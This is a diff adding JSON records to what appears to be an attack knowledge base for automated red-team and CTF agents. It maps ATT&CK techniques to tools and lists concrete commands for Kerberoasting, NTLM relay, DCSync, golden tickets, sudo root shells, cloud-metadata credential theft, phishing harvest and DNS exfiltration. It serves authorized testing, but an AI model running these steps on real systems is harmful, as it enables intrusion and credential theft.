+   "technique_name": "Adversary-in-the-Middle",
+   "sub_techniques": ".001 Name Resolution Poisoning and SMB Relay",
+   "operation": "LLMNR/NBT-NS 投毒+NTLM 中继",
+   "tools": "Responder, ntlmrelayx",
+   "agent_type": "内网横向 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 18,
+   "tactic_id": "TA0006",
+   "tactic_name": "Credential Access",
+   "technique_id": "T1558",
+   "technique_name": "Steal or Forge Kerberos Tickets",
+   "sub_techniques": ".001 Golden/.002 Silver/.003 Kerberoasting/.004 AS-REP Roasting",
+   "operation": "Kerberos 票据窃取/伪造",
+   "tools": "Rubeus, Impacket(GetUserSPNs/ticketer)",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 19,
+   "tactic_id": "TA0006",
+   "tactic_name": "Credential Access",
+   "technique_id": "T1552",
+   "technique_name": "Unsecured Credentials",
+   "sub_techniques": ".004 Private Keys/.005 Cloud Instance Metadata API/.007 Container API",
+   "operation": "找私钥/云元数据/容器 API",
+   "tools": "curl, awscli",
+   "agent_type": "后渗透/云 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 20,
+   "tactic_id": "TA0007",
+   "tactic_name": "Discovery",
+   "technique_id": "T1087",
+   "technique_name": "Account Discovery",
+   "sub_techniques": ".001 Local/.002 Domain",
+   "operation": "枚举本地/域账户",
+   "tools": "net user, BloodHound, PowerView",
+   "agent_type": "内网探测 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 21,
+   "tactic_id": "TA0007",
+   "tactic_name": "Discovery",
+   "technique_id": "T1016",
+   "technique_name": "System Network Configuration Discovery",
+   "sub_techniques": "-",
+   "operation": "网卡/路由/ARP/内网网段",
+   "tools": "ipconfig, route, arp",
+   "agent_type": "内网探测 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 22,
+   "tactic_id": "TA0008",
+   "tactic_name": "Lateral Movement",
+   "technique_id": "T1021",
+   "technique_name": "Remote Services",
+   "sub_techniques": ".001 RDP/.002 SMB/.006 WinRM",
+   "operation": "远程服务横向（RDP/SMB/WinRM）",
+   "tools": "xfreerdp, psexec, evil-winrm",
+   "agent_type": "内网横向 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 23,
+   "tactic_id": "TA0008",
+   "tactic_name": "Lateral Movement",
+   "technique_id": "T1550",
+   "technique_name": "Use Alternate Authentication Material",
+   "sub_techniques": ".001 Pass-the-Hash/.002 Pass-the-Ticket/.003 Pass-the-Cookie",
+   "operation": "PTH/PtT/PtC",
+   "tools": "mimikatz, impacket",
+   "agent_type": "内网横向 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 24,
+   "tactic_id": "TA0009",
+   "tactic_name": "Collection",
+   "technique_id": "T1005",
+   "technique_name": "Data from Local System",
+   "sub_techniques": "-",
+   "operation": "收集本地敏感数据",
+   "tools": "find, grep",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 25,
+   "tactic_id": "TA0011",
+   "tactic_name": "C2",
+   "technique_id": "T1071",
+   "technique_name": "Application Layer Protocol",
+   "sub_techniques": ".001 Web Protocols/.004 DNS",
+   "operation": "利用 HTTP(S)/DNS 做 C2",
+   "tools": "Cobalt Strike, dnscat2",
+   "agent_type": "C2 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 26,
+   "tactic_id": "TA0010",
+   "tactic_name": "Exfiltration",
+   "technique_id": "T1041",
+   "technique_name": "Exfiltration Over C2 Channel",
+   "sub_techniques": "-",
+   "operation": "经现有 C2 通道外传",
+   "tools": "C2 框架",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 27,
+   "tactic_id": "TA0010",
+   "tactic_name": "Exfiltration",
+   "technique_id": "T1048",
+   "technique_name": "Exfiltration Over Alternative Protocol",
+   "sub_techniques": ".001 Symmetric/.002 Asymmetric/.003 Unencrypted Non-C2",
+   "operation": "经替代协议（DNS/ICMP/SMTP）外传",
+   "tools": "dnscat2, icmp 隧道",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  }
+ ],
+ "exp_redteam_entries": [
+  {
+   "entry_id": "RT-AD-003",
+   "title": "Kerberoasting 域内服务账户离线破解",
+   "tactic_ids": [
+    "TA0006"
+   ],
+   "technique_id": "T1558.003",
+   "os_platform": [
+    "Windows",
+    "Linux"
+   ],
+   "preconditions": [
+    "已获得任一域普通用户的可用凭据（用户名/密码 或 hash）",
+    "能与域控 88 端口(Kerberos)通信",
+    "目标域内存在注册了 SPN 的用户账户"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "枚举带 SPN 的账户",
+     "command": "impacket-GetUserSPNs.py domain/user:pass -dc-ip <DC_IP> -request",
+     "expected": "列出 SPN 账户并导出 TGS 加密部分"
+    },
+    {
+     "step": 2,
+     "action": "离线破解",
+     "command": "hashcat -m 13100 tgs_hash.txt rockyou.txt",
+     "expected": "破解出服务账户明文密码"
+    }
+   ],
+   "tools": [
+    "impacket-GetUserSPNs",
+    "Rubeus",
+    "hashcat"
+   ],
+   "verify_method": "hashcat 输出明文密码，且用该密码能成功登录对应账户",
+   "expected_result": "获得高权限服务账户明文，可用于横向或 DCSync 前置",
+   "fail_handling": "破解失败→检查密码策略；无弱口令→转 BloodHound 枚举 ACL/约束委派/AD CS 提权路径",
+   "source": "https://attack.mitre.org/techniques/T1558/003/ ; https://hacktricks.wiki/ (Active Directory Methodology > Kerberoast)",
+   "severity": "high",
+   "category": "windows_domain",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-WEB-001",
+   "title": "Web 漏洞最小化 PoC 确认",
+   "tactic_ids": [
+    "TA0001"
+   ],
+   "technique_id": "T1190",
+   "os_platform": [
+    "Web",
+    "通用"
+   ],
+   "preconditions": [
+    "指纹与技术栈已知"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "Web 漏洞探测与确认",
+     "command": "Burp/nuclei/sqlmap 对疑似漏洞逐一验证",
+     "expected": "返回异常/可执行"
+    }
+   ],
+   "tools": [
+    "Burp",
+    "nuclei",
+    "sqlmap"
+   ],
+   "verify_method": "对每个疑似漏洞做最小化 PoC，确认返回异常/可执行",
+   "expected_result": "漏洞确认可利用，进入打点环节",
+   "fail_handling": "无 RCE 但有 SQLi → 转数据库取凭据；有 SSRF → 转云路径（PATH-CLOUD-SSRF-04）",
+   "source": "设计书附录B-四 路径1 步1.2",
+   "severity": "high",
+   "category": "web_entry",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-WEB-002",
+   "title": "初始 Shell 权限与主机确认",
+   "tactic_ids": [
+    "TA0002"
+   ],
+   "technique_id": "T1059",
+   "os_platform": [
+    "Windows",
+    "Linux"
+   ],
+   "preconditions": [
+    "Web 漏洞确认可利用"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "利用漏洞获取初始 Shell",
+     "command": "exp 脚本/msf 触发漏洞",
+     "expected": "whoami/id 回显当前权限与主机名"
+    }
+   ],
+   "tools": [
+    "exp 脚本",
+    "msf"
+   ],
+   "verify_method": "执行 whoami/id 回显，确认当前权限与主机名",
+   "expected_result": "获得初始立足点，明确当前权限级别",
+   "fail_handling": "拿不到交互 → 先稳定通道（bash -i/nc/msfvenom）再枚举",
+   "source": "设计书附录B-四 路径1 步1.3",
+   "severity": "high",
+   "category": "web_entry",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-AD-001",
+   "title": "域信息枚举（BloodHound）",
+   "tactic_ids": [
+    "TA0007"
+   ],
+   "technique_id": "T1087.002",
+   "os_platform": [
+    "Windows"
+   ],
+   "preconditions": [
+    "已获得域内普通用户权限"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "域信息枚举",
+     "command": "SharpHound 收集 / PowerView / impacket-GetADUsers",
+     "expected": "拿到域 SID、DC IP、用户清单"
+    }
+   ],
+   "tools": [
+    "BloodHound(SharpHound)",
+    "PowerView",
+    "impacket-GetADUsers"
+   ],
+   "verify_method": "拿到域 SID、DC IP、用户清单",
+   "expected_result": "域拓扑与攻击面图谱，支撑后续 Kerberoasting/委派路径选路",
+   "fail_handling": "采集被 EDR 拦截 → 改 impacket 远程低频枚举",
+   "source": "设计书附录B-四 路径2 步2.1",
+   "severity": "medium",
+   "category": "windows_domain",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-AD-002",
+   "title": "LLMNR/NBT-NS 投毒 + NTLM 中继",
+   "tactic_ids": [
+    "TA0006"
+   ],
+   "technique_id": "T1557.001",
+   "os_platform": [
+    "Windows",
+    "Linux"
+   ],
+   "preconditions": [
+    "内网可监听流量",
+    "目标网段 SMB 签名未强制"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "投毒监听",
+     "command": "Responder -I eth0",
+     "expected": "捕获 Net-NTLM hash"
+    },
+    {
+     "step": 2,
+     "action": "中继利用",
+     "command": "ntlmrelayx.py -t smb://target",
+     "expected": "中继拿到 shell 或解出账号"
+    }
+   ],
+   "tools": [
+    "Responder",
+    "ntlmrelayx"
+   ],
+   "verify_method": "捕获到 Net-NTLM hash；中继到目标机器拿到 shell 或解出账号",
+   "expected_result": "获得内网机器立足点或可用凭据",
+   "fail_handling": "SMB 签名强制 → 中继失败，退回 Kerberoasting（RT-AD-003）",
+   "source": "设计书附录B-四 路径2 步2.2",
+   "severity": "high",
+   "category": "windows_domain",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-AD-004",
+   "title": "DCSync 全域凭据同步",
+   "tactic_ids": [
+    "TA0006"
+   ],
+   "technique_id": "T1003.006",
+   "os_platform": [
+    "Windows",
+    "Linux"
+   ],
+   "preconditions": [
+    "拥有 DS-Replication 权限（域管/特定 ACE）"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "DCSync",
+     "command": "mimikatz lsadump::dcsync /user:krbtgt",
+     "expected": "拿到 krbtgt hash 与全域用户 hash"
+    }
+   ],
+   "tools": [
+    "mimikatz",
+    "impacket-secretsdump"
+   ],
+   "verify_method": "拿到 krbtgt hash 与全域用户 hash",
+   "expected_result": "全域凭据掌控，黄金票据前置",
+   "fail_handling": "权限不足 → 先 BloodHound 找 ACE 提权路径",
+   "source": "设计书附录B-四 路径2 步2.7",
+   "severity": "critical",
+   "category": "windows_domain",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-AD-005",
+   "title": "黄金票据伪造任意账户 TGT",
+   "tactic_ids": [
+    "TA0006"
+   ],
+   "technique_id": "T1558.001",
+   "os_platform": [
+    "Windows",
+    "Linux"
+   ],
+   "preconditions": [
+    "已拿到 krbtgt hash 与域 SID"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "伪造黄金票据",
+     "command": "mimikatz kerberos::golden /user:Administrator /domain:<域> /sid:<SID> /krbtgt:<hash>（或 ticketer.py）",
+     "expected": "伪造任意账户 TGT"
+    }
+   ],
+   "tools": [
+    "mimikatz",
+    "Rubeus",
+    "ticketer.py"
+   ],
+   "verify_method": "伪造任意账户 TGT，能访问任意域资源",
+   "expected_result": "域内持久化最高权限访问能力",
+   "fail_handling": "票据失效 → krbtgt 已轮换需重新 DCSync；备选白银票据针对单服务",
+   "source": "设计书附录B-四 路径2 步2.8",
+   "severity": "critical",
+   "category": "windows_domain",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-LIN-001",
+   "title": "sudo 配置滥用提权（GTFOBins 对照）",
+   "tactic_ids": [
+    "TA0004"
+   ],
+   "technique_id": "T1548.003",
+   "os_platform": [
+    "Linux"
+   ],
+   "preconditions": [
+    "非 root 交互式 Shell"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "列出 sudo 权限",
+     "command": "sudo -l",
+     "expected": "列出 NOPASSWD/可执行二进制"
+    },
+    {
+     "step": 2,
+     "action": "对照 GTFOBins 逐条利用",
+     "command": "sudo find . -exec /bin/sh \\;",
+     "expected": "拿到 root shell"
+    }
+   ],
+   "tools": [
+    "sudo",
+    "GTFOBins"
+   ],
+   "verify_method": "如 sudo find . -exec /bin/sh \\; 拿到 root shell",
+   "expected_result": "root 权限",
+   "fail_handling": "无可滥用 sudo → 转 SUID（RT-LIN-002）→ cron → 内核 CVE（易崩慎用）",
+   "source": "设计书附录B-四 路径3 步3.2",
+   "severity": "high",
+   "category": "linux_privesc",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-LIN-002",
+   "title": "SUID/SGID 二进制提权",
+   "tactic_ids": [
+    "TA0004"
+   ],
+   "technique_id": "T1548",
+   "os_platform": [
+    "Linux"
+   ],
+   "preconditions": [
+    "非 root 交互式 Shell"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "枚举 SUID/SGID",
+     "command": "find / -perm -4000 -type f 2>/dev/null",
+     "expected": "SUID 二进制清单"
+    },
+    {
+     "step": 2,
+     "action": "GTFOBins 逐个查",
+     "command": "vim/nmap/python 等以 root 跑 shell",
+     "expected": "root shell"
+    }
+   ],
+   "tools": [
+    "find",
+    "GTFOBins"
+   ],
+   "verify_method": "如 vim/nmap/python 以 root 跑 shell",
+   "expected_result": "root 权限",
+   "fail_handling": "无 SUID 面 → cron 可写 → SSH 私钥 → 内核 CVE（最后手段，先快照）",
+   "source": "设计书附录B-四 路径3 步3.3",
+   "severity": "high",
+   "category": "linux_privesc",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-CLD-001",
+   "title": "SSRF 打云元数据窃取临时凭据",
+   "tactic_ids": [
+    "TA0006"
+   ],
+   "technique_id": "T1552.005",
+   "os_platform": [
+    "Cloud",
+    "Web"
+   ],
+   "preconditions": [
+    "Web 存在 SSRF（服务器可发起任意请求）",
+    "目标在云主机上"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "访问元数据服务",
+     "command": "http://169.254.169.254/latest/meta-data/iam/security-credentials/（AWS） / http://100.100.100.200/（阿里云）",
+     "expected": "返回角色名"
+    },
+    {
+     "step": 2,
+     "action": "窃取临时凭据",
+     "command": "访问角色路径",
+     "expected": "拿到 AccessKeyId/SecretAccessKey/Token"
+    }
+   ],
+   "tools": [
+    "curl",
+    "awscli",
+    "Burp Collaborator / interactsh"
+   ],
+   "verify_method": "拿到 AccessKeyId/SecretAccessKey/Token（IMDSv1 无防护时）",
+   "expected_result": "云临时凭据，可枚举 IAM 权限并尝试提权",
+   "fail_handling": "IMDSv2 强制（需 PUT token）→ SSRF 无法带 token，转找硬编码 AK/SK（T1552.001）",
+   "source": "设计书附录B-四 路径4 步4.2/4.3",
+   "severity": "critical",
+   "category": "cloud",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-PHI-001",
+   "title": "鱼叉钓鱼与凭据收割（授权范围内）",
+   "tactic_ids": [
+    "TA0001"
+   ],
+   "technique_id": "T1566",
+   "os_platform": [
+    "Windows",
+    "通用"
+   ],
+   "preconditions": [
+    "有目标员工邮箱清单（OSINT 所得）",
+    "授权范围内可发钓鱼邮件"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "素材准备",
+     "command": "gophish 克隆登录页",
+     "expected": "本地测试页面可收集凭据"
+    },
+    {
+     "step": 2,
+     "action": "投递",
+     "command": "T1566.001 附件/.002 链接/.003 第三方",
+     "expected": "邮件送达不触发网关"
+    },
+    {
+     "step": 3,
+     "action": "收割",
+     "command": "仿冒页收集输入",
+     "expected": "后台收到明文凭据或回调"
+    }
+   ],
+   "tools": [
+    "gophish",
+    "宏",
+    "LNK"
+   ],
+   "verify_method": "后台收到明文凭据或回调",
+   "expected_result": "用户凭据或落地会话，转路径 2 域攻击链",
+   "fail_handling": "MFA 强制 → 转会话 cookie 复用（T1550.003/T1539）；无回调换素材重投",
+   "source": "设计书附录B-四 路径5 步5.1-5.3",
+   "severity": "high",
+   "category": "phishing",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-EXF-001",
+   "title": "DNS 隧道替代协议外泄",
+   "tactic_ids": [
+    "TA0010"
+   ],
+   "technique_id": "T1048.003",
+   "os_platform": [
+    "Windows",
+    "Linux"
+   ],
+   "preconditions": [
+    "已收集打包数据",
+    "C2 通道受限但 53 出网"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "DNS 隧道外发",
+     "command": "dnscat2 将数据编码进子域名/TXT 记录",
+     "expected": "攻击者 DNS 服务器收到数据"
+    }
+   ],
+   "tools": [
+    "dnscat2",
+    "icmp 隧道"
+   ],
+   "verify_method": "攻击者 DNS 服务器/邮件收到数据分片",
+   "expected_result": "授权范围内证明数据可被外传",
+   "fail_handling": "53 也不通 → 降级证明「已打包待传」并记录日志证据",
+   "source": "设计书附录B-四 路径6 步6.5b",
+   "severity": "medium",
+   "category": "exfiltration",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-WEB-LEAK-001",
+   "title": "Web 敏感路径与备份文件检查清单",
+   "tactic_ids": [
+    "TA0001"
+   ],
+   "technique_id": "T1190",
+   "os_platform": [
+    "Web",
+    "通用"
+   ],
+   "preconditions": [
+    "目标可达或已取得附件"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "robots.txt 与 sitemap",
+     "command": "GET /robots.txt、/sitemap.xml",
+     "expected": "Disallow 条目点名隐藏路径；看到敏感目录名即升级"
+    },
+    {
+     "step": 2,
+     "action": "版本库泄露",
+     "command": "GET /.git/HEAD、/.svn/entries、/.hg/hgrc",
+     "expected": "返回 ref: refs/heads/... 即 .git 源码可恢复（gakki412/松散文件）"
+    },
+    {
+     "step": 3,
+     "action": "环境与配置文件",
+     "command": "GET /.env、/.env.bak、/config.php.bak、/application.yml、/WEB-INF/web.xml",
+     "expected": "返回数据库串/密钥/调试开关等内容"
+    },
+    {
+     "step": 4,
+     "action": "备份与编辑器残留",
+     "command": "GET /www.zip、/backup.zip、/web.rar、/site.tar.gz、/index.php.bak、/.index.php.swp",
+     "expected": "返回压缩包或源码片段而非 404"
+    },
+    {
+     "step": 5,
+     "action": "目录指纹与信息文件",
+     "command": "GET /.DS_Store、/composer.json、/package.json、/npm-shrinkwrap.json",
+     "expected": "暴露目录结构/依赖树，可进一步枚举路径"
+    },
+    {
+     "step": 6,
+     "action": "调试与管理面",
+     "command": "GET /phpinfo.php、/info.php、/test.php、/debug、/console、/actuator、/swagger、/api-docs、/admin",
+     "expected": "phpinfo 含 FLAG 环境变量与扩展清单；actuator/docs 暴露内部接口"
+    },
+    {
+     "step": 7,
+     "action": "服务自述",
+     "command": "GET /server-status、/cgi-bin/、/.well-known/",
+     "expected": "Apache 状态页/CGI 入口/协议揭示"
+    }
+   ],
+   "tools": [
+    "http_request",
+    "shell",
+    "python"
+   ],
+   "verify_method": "任一路径返回非 404 且内容含凭据/源码/结构信息即升级为主线",
+   "expected_result": "命中检查点并取得线索",
+   "fail_handling": "全 404 则放下清单，回到页面功能本身（表单、参数、JS 接口、注释）",
+   "source": "设计书附录B/附录C 知识源（HackTricks、PayloadsAllTheThings、GTFOBins、小虎鲸CTF）",
+   "severity": "info",
+   "category": "web_entry",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-WEB-PHP-002",
+   "title": "PHP 弱类型与比较特性事实表",
+   "tactic_ids": [
+    "TA0001"
+   ],
+   "technique_id": "-",
+   "os_platform": [
+    "Web"
+   ],
+   "preconditions": [
+    "目标可达或已取得附件"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "empty 与 \"0\"",
+     "command": "empty(\"0\") === true 且 \"0\" !== \"\"",
+     "expected": "isset+empty+!== 组合可用字符串 \"0\" 通过"
+    },
+    {
+     "step": 2,
+     "action": "0e magic hash",
+     "command": "md5(\"240610708\") == \"0\" 成立（0e462…全数字）；同类样本 QNKCDZO、alambana",
+     "expected": "松散比较下 md5 结果形如 0e\\d+ 等价于 0"
+    },
+    {
+     "step": 3,
+     "action": "科学计数法",
+     "command": "strlen(\"1e4\") === 3 且 1e4 > 1000",
+     "expected": "长度限制与数值限制可用同一字符串同时满足"
+    },
+    {
+     "step": 4,
+     "action": "数组绕过 hash 比较",
+     "command": "md5([1,2]) 与 md5([3,4]) 均为 NULL，== 宽松比较为 true；sha1 同理",
+     "expected": "以数组为参时 md5/sha1 返回 NULL，NULL==NULL 成立"
+    },
+    {
+     "step": 5,
+     "action": "strcmp 数组传参",
+     "command": "strcmp($x, []) 在 PHP5 返回 NULL，==0 判 true",
+     "expected": "参数传数组可绕过字符串比较"
+    },
+    {
+     "step": 6,
+     "action": "preg_match 未锚定",
+     "command": "模式缺少 $ 或 \\z 时，载荷末尾追加 %0a（换行）可绕过尾部匹配",
+     "expected": "匹配通过但后半段带入了注入载荷"
+    },
+    {
+     "step": 7,
+     "action": "in_array 宽松",
+     "command": "in_array(0, [\"a\", \"b\"]) === true",
+     "expected": "未设第三参 true 的数组查找可被 0/\"\" 混入"
+    }
+   ],
+   "tools": [
+    "http_request",
+    "shell",
+    "python"
+   ],
+   "verify_method": "以题目源码实际使用的比较运算符（== 与 ===）逐条对照",
+   "expected_result": "命中检查点并取得线索",
+   "fail_handling": "全程 === / 强类型时弱类型路径全部失效，转找逻辑漏洞或注入面",
+   "source": "设计书附录B/附录C 知识源（HackTricks、PayloadsAllTheThings、GTFOBins、小虎鲸CTF）",
+   "severity": "info",
+   "category": "web_entry",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-WEB-SSTI-003",
+   "title": "模板注入 canary 与引擎判别",
+   "tactic_ids": [
+    "TA0001"
+   ],
+   "technique_id": "-",
+   "os_platform": [
+    "Web"
+   ],
+   "preconditions": [
+    "目标可达或已取得附件"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "通用 canary",
+     "command": "{{7*7}}、${7*7}、<%= 7*7 %>、{7*7}、#{7*7} 逐个注入并比对回显",
+     "expected": "回显 49/49/49/49/49 即对应语法被求值"
+    },
+    {
+     "step": 2,
+     "action": "Jinja2 判别",
+     "command": "{{7*'7'}} → 7777777",
+     "expected": "Jinja2 特征（Twig 为 49）"
+    },
+    {
+     "step": 3,
+     "action": "Smarty 判别",
+     "command": "{7*7} → 49 且 {$smarty.version} 有回显",
+     "expected": "Smarty 模板引擎"
+    },
+    {
+     "step": 4,
+     "action": "表达式环境",
+     "command": "Spring: #{...}；OGNL: %{...}（Struts2）",
+     "expected": "对应 Java 环境的求值语法"
+    }
+   ],
+   "tools": [
+    "http_request",
+    "shell",
+    "python"
+   ],
+   "verify_method": "canary 被求值即确认 SSTI，后续 payload 由现场选择",
+   "expected_result": "命中检查点并取得线索",
+   "fail_handling": "全部原样回显则不是模板注入，转查其他参数注入面",
+   "source": "设计书附录B/附录C 知识源（HackTricks、PayloadsAllTheThings、GTFOBins、小虎鲸CTF）",
+   "severity": "info",
+   "category": "web_entry",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-MISC-STEG-004",
+   "title": "隐写与附件检查清单",
+   "tactic_ids": [
+    "TA0001"
+   ],
+   "technique_id": "-",
+   "os_platform": [
+    "通用"
+   ],
+   "preconditions": [
+    "目标可达或已取得附件"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "魔数与结构",
+     "command": "file x；xxd x | head；对比扩展名与真实格式",
+     "expected": "格式不符即改后缀/换解析器（容器内藏文件）"
+    },
+    {
+     "step": 2,
+     "action": "嵌入文件",
+     "command": "binwalk -Me x；foremost x",
+     "expected": "分离出内嵌的 zip/图片/文本"
+    },
+    {
+     "step": 3,
+     "action": "字符串全量",
+     "command": "strings -n 6 x；strings -el x（UTF-16LE）",
+     "expected": "明文 flag、密码提示、URL"
+    },
+    {
+     "step": 4,
+     "action": "元数据",
+     "command": "exiftool x",
+     "expected": "Comment/Author/GPS 里的线索"
+    },
+    {
+     "step": 5,
+     "action": "零宽字符",
+     "command": "python 检查 U+200B/200C/200D/FEFF 序列",
+     "expected": "零宽编码的隐藏信息"
+    },
+    {
+     "step": 6,
+     "action": "尾随数据",
+     "command": "PNG 检查 IEND 之后字节；JPEG 检查 FFD9 之后字节",
+     "expected": "文件尾附加的压缩包/文本"
+    },
+    {
+     "step": 7,
+     "action": "通道隐写",
+     "command": "zsteg x（PNG/BMP LSB）；steghide extract -sf x（先试空口令）；音频看频谱图",
+     "expected": "LSB 平面异色、口令命中、频谱可见图案"
+    },
+    {
+     "step": 8,
+     "action": "压缩包",
+     "command": "zipinfo/7z l 看注释与加密位；伪加密改标志位",
+     "expected": "注释线索/伪加密可解"
+    }
+   ],
+   "tools": [
+    "http_request",
+    "shell",
+    "python"
+   ],
+   "verify_method": "任一手段产出可读线索即跟进；输出仍过 Flag 提取",
+   "expected_result": "命中检查点并取得线索",
+   "fail_handling": "全无产出则回到题面描述重新审题",
+   "source": "设计书附录B/附录C 知识源（HackTricks、PayloadsAllTheThings、GTFOBins、小虎鲸CTF）",
+   "severity": "info",
+   "category": "misc_stego",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "entry_id": "RT-LIN-PRIV-005",
+   "title": "Linux 提权检查点（GTFOBins 对照）",
+   "tactic_ids": [
+    "TA0001"
+   ],
+   "technique_id": "T1548",
+   "os_platform": [
+    "Linux"
+   ],
+   "preconditions": [
+    "目标可达或已取得附件"
+   ],
+   "steps": [
+    {
+     "step": 1,
+     "action": "sudo 配置",
+     "command": "sudo -l",
+     "expected": "出现 (root) NOPASSWD 条目 → GTFOBins 查对应二进制用法"
+    },
+    {
+     "step": 2,
+     "action": "SUID/SGID",
+     "command": "find / -perm -4000 -o -perm -2000 -type f 2>/dev/null",
+     "expected": "非标准 SUID 二进制（nmap --interactive、vim、find 等）"
+    },
+    {
+     "step": 3,
+     "action": "文件能力",
+     "command": "getcap -r / 2>/dev/null",
+     "expected": "cap_setuid+ep 等能力位（python/perl 可直接提权）"
+    },
+    {
+     "step": 4,
+     "action": "计划任务",
+     "command": "cat /etc/crontab；ls -la /etc/cron*",
+     "expected": "root 执行且脚本可写 → 注入命令"
+    },
+    {
+     "step": 5,
+     "action": "内核版本",
+     "command": "uname -a",
+     "expected": "老内核对照已知 CVE（注意：可能崩溃系统，CTF 靶机可试）"
+    }
+   ],
+   "tools": [
+    "http_request",
+    "shell",
+    "python"
+   ],
+   "verify_method": "任一检查点给出可直接执行命令且回显 root 身份即完成提权",
+   "expected_result": "命中检查点并取得线索",
+   "fail_handling": "逐项无果则转向凭据搜集与横向（转路径模板 2）",
+   "source": "设计书附录B/附录C 知识源（HackTricks、PayloadsAllTheThings、GTFOBins、小虎鲸CTF）",
+   "severity": "info",
+   "category": "privilege_escalation",
+   "last_verified": "2026-10-09"
+  }
+ ],
+ "exp_attack_paths": [
+  {
+   "path_id": "PATH-WEB-TO-INTRANET-01",
+   "scenario": "Web 打点 → 内网横向（最经典 SRC 路径）",
+   "entry_conditions": "发现公网 URL，且存在 RCE/文件上传/SQLi/SSRF 等可直达执行的漏洞",
+   "step_sequence": [
+    {
+     "step": "1.1",
+     "action": "信息收集：子域名、端口、指纹、技术栈",
+     "precondition": "入口可达",
+     "tools": "amass, nmap, whatweb, nuclei",
+     "verify": "输出资产清单，确认开放端口与框架版本"
+    },
+    {
+     "step": "1.2",
+     "action": "Web 漏洞探测与确认",
+     "precondition": "指纹已知",
+     "tools": "Burp, nuclei, sqlmap",
+     "verify": "核验：对每个疑似漏洞做最小化 PoC，确认返回异常/可执行"
+    },
+    {
+     "step": "1.3",
+     "action": "利用漏洞获取初始 Shell",
+     "precondition": "漏洞可利用",
+     "tools": "exp 脚本, msf",
+     "verify": "核验：执行 whoami/id 回显，确认当前权限与主机名"
+    },
+    {
+     "step": "1.4",
+     "action": "反弹/交互式 Shell 稳定化",
+     "precondition": "已命令执行",
+     "tools": "bash -i, nc, msfvenom",
+     "verify": "核验：能执行交互命令、能上传文件"
+    },
+    {
+     "step": "1.5",
+     "action": "本机枚举：系统版本、用户、网络配置",
+     "precondition": "立足成功",
+     "tools": "ipconfig/ifconfig, systeminfo",
+     "verify": "确认内网网段、是否域成员"
+    },
+    {
+     "step": "1.6",
+     "action": "内网探测：存活、端口、域控位置",
+     "precondition": "拿到内网网卡",
+     "tools": "nmap, fscan, crackmapexec",
+     "verify": "输出内网拓扑与存活主机清单"
+    },
+    {
+     "step": "1.7",
+     "action": "本机/横向提权",
+     "precondition": "有普通权限",
+     "tools": "根据 OS 选提权路径（见路径 3/2）",
+     "verify": "核验：拿到 admin/root/SYSTEM 或域管"
+    },
+    {
+     "step": "1.8",
+     "action": "横向移动到目标主机",
+     "precondition": "有可用凭据/服务",
+     "tools": "PsExec/WinRM/WMI/RDP",
+     "verify": "核验：在目标机执行命令回显"
+    },
+    {
+     "step": "1.9",
